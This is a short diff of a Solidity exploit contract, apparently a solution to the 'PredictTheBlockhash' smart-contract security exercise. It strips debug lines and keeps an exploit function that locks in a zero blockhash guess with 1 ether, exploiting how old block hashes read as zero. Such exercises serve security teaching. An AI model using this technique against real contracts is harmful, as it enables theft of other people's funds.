@@ -60,10 +60,7 @@ contract ExploitContract {
     // write your exploit code below
 
     function exploit() public payable {
-        uint256 blockNumber = block.number + 1;
-        // console.log("blockNumber", blockNumber);
-        bytes32 g = bytes32(0); //blockhash(blockNumber);
-        // console.logBytes32( g);
+        bytes32 g = bytes32(0); 
         predictTheBlockhash.lockInGuess{value: 1 ether}(g);
     }
 
